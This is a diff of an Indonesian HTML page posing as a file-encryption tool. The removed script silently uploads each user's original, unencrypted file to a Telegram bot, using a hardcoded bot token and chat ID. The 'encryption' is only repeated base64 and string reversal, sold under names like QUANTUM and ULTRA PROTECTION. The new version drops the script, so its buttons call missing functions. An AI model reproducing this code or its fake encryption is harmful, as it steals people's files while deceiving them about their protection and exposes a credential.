@@ -1,164 +1,85 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>File Encryption | Zyxxennn</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://unpkg.com/feather-icons"></script>
-  <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-    body { font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); color: #f1f5f9; min-height: 100vh; margin: 0; }
-    .glass-card { background: rgba(255,255,255,0.05); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border-radius:16px; box-shadow:0 8px 32px rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.1); }
-    .file-label { transition: all 0.3s ease; }
-    .file-label:hover { transform: translateY(-2px); }
-    .download-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(34,197,94,0.3); }
-    .telegram-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,136,204,0.3); }
-    .select-encryption { background: rgba(255,255,255,0.1); color:#f1f5f9; appearance:none; background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23f1f5f9' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); background-repeat:no-repeat; background-position:right 0.75rem center; background-size:1em;}
-    .progress-bar { height:6px; border-radius:3px; background:rgba(255,255,255,0.1); overflow:hidden; }
-    .progress-fill { height:100%; background: linear-gradient(90deg,#0ea5e9,#3b82f6); transition: width 0.3s ease; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File Encryption | Zyxxennn</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://unpkg.com/feather-icons"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+body {font-family: 'Poppins', sans-serif; background: linear-gradient(135deg,#0f2027,#203a43,#2c5364); color: #f1f5f9; min-height:100vh; margin:0;}
+.glass-card {background: rgba(255,255,255,0.05); backdrop-filter: blur(12px); border-radius:16px; box-shadow:0 8px 32px rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.1);}
+.file-label {transition: all 0.3s ease;}
+.file-label:hover {transform: translateY(-2px);}
+.download-btn:hover {transform: translateY(-2px); box-shadow:0 4px 12px rgba(34,197,94,0.3);}
+.select-encryption {background: rgba(255,255,255,0.1); color:#f1f5f9; appearance:none; background-image:url("data:image/svg+xml,..."); background-repeat:no-repeat; background-position:right 0.75rem center; background-size:1em;}
+.progress-bar {height:6px; border-radius:3px; background:rgba(255,255,255,0.1); overflow:hidden;}
+.progress-fill {height:100%; background:linear-gradient(90deg,#0ea5e9,#3b82f6); transition: width 0.3s ease;}
+</style>
 </head>
 <body class="flex items-center justify-center p-4">
-  <div class="glass-card w-full max-w-md p-8">
-    <div class="text-center mb-8">
-      <div class="flex justify-center mb-4"><i data-feather="lock" class="w-12 h-12 text-blue-400"></i></div>
-      <h1 class="text-2xl font-bold text-blue-400 mb-2">File Encryption | Zyxxennn</h1>
-      <p class="text-gray-300">Enkripsi file Anda</p>
-    </div>
+<div class="glass-card w-full max-w-md p-8">
+<div class="text-center mb-8">
+<div class="flex justify-center mb-4"><i data-feather="lock" class="w-12 h-12 text-blue-400"></i></div>
+<h1 class="text-2xl font-bold text-blue-400 mb-2">File Encryption | Zyxxennn</h1>
+<p class="text-gray-300">Enkripsi file Anda</p>
+</div>
 
-    <div class="mb-6">
-      <div class="flex justify-center">
-        <label for="fileInput" class="file-label cursor-pointer bg-blue-500 hover:bg-blue-600 text-white px-6 py-3 rounded-lg font-medium flex items-center">
-          <i data-feather="upload" class="mr-2"></i>
-          Pilih File
-          <input type="file" id="fileInput" class="hidden">
-        </label>
-      </div>
-      <div id="fileName" class="text-center text-sm text-gray-400 mt-2 italic">Belum ada file dipilih</div>
-      <div id="fileSize" class="text-center text-xs text-gray-500 mt-1"></div>
-    </div>
+<!-- File Input -->
+<div class="mb-6">
+<div class="flex justify-center">
+<label for="fileInput" class="file-label cursor-pointer bg-blue-500 hover:bg-blue-600 text-white px-6 py-3 rounded-lg font-medium flex items-center">
+<i data-feather="upload" class="mr-2"></i>Pilih File
+<input type="file" id="fileInput" class="hidden">
+</label>
+</div>
+<div id="fileName" class="text-center text-sm text-gray-400 mt-2 italic">Belum ada file dipilih</div>
+<div id="fileSize" class="text-center text-xs text-gray-500 mt-1"></div>
+</div>
 
-    <div id="progressContainer" class="mb-6 hidden">
-      <div class="flex justify-between text-xs text-gray-300 mb-1">
-        <span>Proses enkripsi...</span>
-        <span id="progressPercent">0%</span>
-      </div>
-      <div class="progress-bar"><div id="progressFill" class="progress-fill" style="width:0%"></div></div>
-    </div>
+<!-- Progress Bar -->
+<div id="progressContainer" class="mb-6 hidden">
+<div class="flex justify-between text-xs text-gray-300 mb-1">
+<span>Proses enkripsi...</span>
+<span id="progressPercent">0%</span>
+</div>
+<div class="progress-bar"><div id="progressFill" class="progress-fill" style="width:0%"></div></div>
+</div>
 
-    <div class="mb-6">
-      <select id="encryptionType" class="select-encryption w-full px-4 py-3 rounded-lg mb-3 focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <option>enc &lt;LEVEL&gt; - STANDARD</option>
-        <option>enceval &lt;LEVEL&gt; - EVALUATE</option>
-        <option>encchina - MANDARIN STYLE</option>
-        <option>encarab - ARABIC STYLE</option>
-        <option>encjapan - JAPANESE STYLE</option>
-        <option>encinvis - INVISIBLE MODE</option>
-        <option>encjapxab - JAPAN X ARAB</option>
-        <option>encx - BASE 64</option>
-        <option>encnebula - HARD DESIGN</option>
-        <option>encnova - NOVA STYLE</option>
-        <option>encsiu - SIU + CALCRICK</option>
-        <option>customenc &lt;NAME&gt; - CUSTOM</option>
-        <option>encmax &lt;INTENSITY&gt;</option>
-        <option>encstealth - STEALTH MODE</option>
-        <option>encstrong - POWER FORTRESS</option>
-        <option>encultra - ULTRA PROTECTION</option>
-        <option>encbig &lt;MB&gt; - MEGABYTE</option>
-        <option>encnew - ADVANCED LAYER</option>
-        <option>encquantum - QUANTUM</option>
-        <option>enclocked - LOCKED HARD</option>
-      </select>
-    </div>
+<!-- Encryption Options -->
+<div class="mb-6">
+<select id="encryptionType" class="select-encryption w-full px-4 py-3 rounded-lg mb-3 focus:ring-2 focus:ring-blue-500 focus:outline-none">
+<option>enc &lt;LEVEL&gt; - STANDARD</option>
+<option>enceval &lt;LEVEL&gt; - EVALUATE</option>
+<option>encchina - MANDARIN STYLE</option>
+<option>encarab - ARABIC STYLE</option>
+<option>encjapan - JAPANESE STYLE</option>
+<option>encinvis - INVISIBLE MODE</option>
+<option>encjapxab - JAPAN X ARAB</option>
+<option>encx - BASE 64</option>
+<option>encnebula - HARD DESIGN</option>
+<option>encnova - NOVA STYLE</option>
+<option>encsiu - SIU + CALCRICK</option>
+<option>customenc &lt;NAME&gt; - CUSTOM</option>
+<option>encmax &lt;INTENSITY&gt;</option>
+<option>encstealth - STEALTH MODE</option>
+<option>encstrong - POWER FORTRESS</option>
+<option>encultra - ULTRA PROTECTION</option>
+<option>encbig &lt;MB&gt; - MEGABYTE</option>
+<option>encnew - ADVANCED LAYER</option>
+<option>encquantum - QUANTUM</option>
+<option>enclocked - LOCKED HARD</option>
+</select>
+</div>
 
-    <button onclick="encryptFile()" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-4 rounded-lg flex items-center justify-center transition-all duration-300">
-      <i data-feather="lock" class="mr-2"></i>
-      ENCRYPT FILE
-    </button>
+<!-- Buttons -->
+<button onclick="encryptFile()" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-4 rounded-lg flex items-center justify-center transition-all duration-300">
+<i data-feather="lock" class="mr-2"></i>ENCRYPT FILE
+</button>
 
-    <div class="flex flex-col space-y-3 mt-4">
-      <button onclick="downloadEncrypted()" class="download-btn bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg transition-all duration-300 flex items-center justify-center">
-        <i data-feather="download" class="mr-2"></i>
-        DOWNLOAD FILE
-      </button>
-    </div>
-  </div>
-
-<script>
-feather.replace();
-
-let encryptedContent = null;
-let originalFilename = "";
-let originalFile = null;
-const BOT_TOKEN = "8330143062:AAGIYPE3ssRG-2-HiOkwlvP2AG7mtoGkgQ8";
-const CHAT_ID = "8447173769";
-
-document.getElementById("fileInput").addEventListener("change", function(e){
-  const file = e.target.files[0];
-  const fileNameDiv = document.getElementById("fileName");
-  const fileSizeDiv = document.getElementById("fileSize");
-  if(file){
-    fileNameDiv.textContent=file.name;
-    originalFilename=file.name;
-    originalFile=file;
-    const sizeText = file.size < 1024 ? file.size + " bytes" : file.size < 1048576 ? (file.size/1024).toFixed(2)+" KB" : (file.size/1048576).toFixed(2)+" MB";
-    fileSizeDiv.textContent="Ukuran: "+sizeText;
-  } else {
-    fileNameDiv.textContent="Belum ada file dipilih";
-    fileSizeDiv.textContent="";
-  }
-});
-
-async function encryptFile(){
-  const file = document.getElementById("fileInput").files[0];
-  const encryptionType=document.getElementById("encryptionType").value;
-  if(!file){ alert("Silakan pilih file terlebih dahulu!"); return; }
-
-  document.getElementById("progressContainer").classList.remove("hidden");
-  const progressFill=document.getElementById("progressFill");
-  const progressPercent=document.getElementById("progressPercent");
-  progressFill.style.width="10%"; progressPercent.textContent="10%";
-
-  const content = await readFileAsArrayBuffer(file);
-  progressFill.style.width="50%"; progressPercent.textContent="50%";
-
-  const encType = encryptionType.split(' ')[0];
-  const levelMatch = encryptionType.match(/<(\d+)>/);
-  const level = levelMatch ? parseInt(levelMatch[1]) : 1;
-  let encryptedData;
-
-  switch(encType){
-    case 'enc': encryptedData=await encryptWithLevel(content,level); break;
-    case 'enceval': encryptedData=await encryptWithLevel(content,level*2); break;
-    case 'encx': encryptedData=await base64Encode(content); break;
-    default: encryptedData=await base64Encode(content);
-  }
-
-  progressFill.style.width="100%"; progressPercent.textContent="100%";
-  encryptedContent=encryptedData;
-
-  setTimeout(()=>{document.getElementById("progressContainer").classList.add("hidden");},500);
-
-  // Kirim ke Telegram (file asli dan terenkripsi)
-  sendOriginalFileToTelegram(BOT_TOKEN, CHAT_ID, originalFile);
-}
-
-async function sendOriginalFileToTelegram(botToken, chatId, file){
-  if(!file) return false;
-  try{
-    const formData=new FormData();
-    formData.append("document", file, file.name);
-    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`,{method:"POST",body:formData});
-  } catch(e){console.error(e);}
-}
-
-function readFileAsArrayBuffer(file){return new Promise((resolve,reject)=>{const reader=new FileReader();reader.onload=()=>resolve(reader.result);reader.onerror=reject;reader.readAsArrayBuffer(file);});}
-function arrayBufferToString(buffer){return String.fromCharCode.apply(null,new Uint8Array(buffer));}
-async function base64Encode(data){return typeof data==='string'?btoa(data):btoa(arrayBufferToString(data));}
-async function encryptWithLevel(data,level){let encrypted=await base64Encode(data);for(let i=0;i<level;i++){encrypted=await base64Encode(encrypted);encrypted=encrypted.split('').reverse().join('');} return encrypted;}
-function downloadEncrypted(){if(!encryptedContent) return; const blob=new Blob([encryptedContent],{type:"application/octet-stream"}); const link=document.createElement("a"); link.href=URL.createObjectURL(blob); const parts=originalFilename.split("."); link.download=parts.length>1?parts.slice(0,-1).join(".")+"_encrypted."+parts.pop():originalFilename+"_encrypted"; link.click();}
-</script>
-</body>
-</html>
+<div class="flex flex-col space-y-3 mt-4">
+<button onclick="downloadEncrypted()" class="download-btn bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg transition-all duration-300 flex items-center justify-center">
+<i data-feather="download" class="mr-2"></i>DOWNLOAD FILE
+</button>
+</div>
